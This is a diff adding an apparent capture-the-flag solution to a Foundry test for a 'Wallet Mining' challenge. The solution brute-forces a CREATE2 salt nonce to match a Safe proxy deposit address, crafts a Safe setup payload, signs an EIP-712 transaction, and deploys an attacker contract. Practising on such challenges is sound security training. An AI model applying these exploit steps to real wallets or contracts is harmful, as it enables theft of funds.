@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {WalletMiningAttacker} from "./WalletMiningAttacker.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -157,7 +158,97 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        bytes memory safeInitData = _walletMiningSafeInitData();
+        uint256 saltNonce = _walletMiningSaltNonce(safeInitData);
+        bytes memory userSig = _walletMiningUserSig();
+
+        new WalletMiningAttacker(
+            address(authorizer),
+            address(walletDeployer),
+            address(token),
+            ward,
+            user,
+            safeInitData,
+            saltNonce,
+            userSig
+        );
+    }
+
+    /// Safe 为 user 的 1-of-1 普通钱包，无 fallbackHandler（拆函数降低 stack too deep）
+    function _walletMiningSafeInitData() private view returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        return abi.encodeCall(
+            Safe.setup,
+            (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
+        );
+    }
+
+    /// 找到使 SafeProxyFactory 部署出 USER_DEPOSIT_ADDRESS 的 saltNonce
+    function _walletMiningSaltNonce(bytes memory safeInitData) private view returns (uint256) {
+        bytes memory proxyCreationCode =
+            abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))));
+        bytes32 proxyCreationCodeHash = keccak256(proxyCreationCode);
+        bytes32 initDataHash = keccak256(safeInitData);
+
+        for (uint256 i = 0; i < 1000; i++) {
+            bytes32 salt = keccak256(abi.encodePacked(initDataHash, i));
+            address predicted = address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(
+                                bytes1(0xff), address(proxyFactory), salt, proxyCreationCodeHash
+                            )
+                        )
+                    )
+                )
+            );
+            if (predicted == USER_DEPOSIT_ADDRESS) {
+                return i;
+            }
+        }
+        revert("saltNonce not found");
+    }
+
+    /// Safe 尚未部署时按已知地址与 nonce=0 构造 EIP-712 并用 user 私钥签名（vm.sign 非 view）
+    function _walletMiningUserSig() private view returns (bytes memory) {
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                keccak256("EIP712Domain(uint256 chainId,address verifyingContract)"),
+                block.chainid,
+                USER_DEPOSIT_ADDRESS
+            )
+        );
+
+        bytes32 SAFE_TX_TYPEHASH = keccak256(
+            "SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"
+        );
+
+        bytes memory transferData =
+            abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                SAFE_TX_TYPEHASH,
+                address(token),
+                uint256(0),
+                keccak256(transferData),
+                uint8(0),
+                uint256(0),
+                uint256(0),
+                uint256(0),
+                address(0),
+                address(0),
+                uint256(0)
+            )
+        );
+
+        bytes32 txHash =
+            keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        return abi.encodePacked(r, s, v);
     }
 
     /**
